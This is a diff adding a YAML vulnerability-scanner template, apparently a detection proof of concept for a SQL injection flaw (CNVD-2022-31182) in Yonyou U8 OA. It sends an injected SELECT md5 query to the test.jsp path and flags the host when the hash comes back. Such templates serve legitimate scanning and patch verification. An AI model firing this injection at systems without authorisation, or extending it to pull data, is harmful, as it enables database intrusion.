@@ -1,0 +1,21 @@
+name: yaml-poc-yonyou-yonyou_u8_oa-sql_injection-CNVD-2022-31182
+binding: 79c422ec-0cce-4df1-bb7c-679619e03f92
+detail:
+    author: system_user
+    links:
+        - https://www.cnvd.org.cn/flaw/show/CNVD-2022-31182
+    vulnerability:
+        id: 54e612fb-d99a-4cf7-ae79-718865f92241
+        level: high
+transport: http
+set:
+    rand: randomInt(200000000, 220000000)
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5({{rand}}))
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(md5(string(rand))))
+expression: r0()
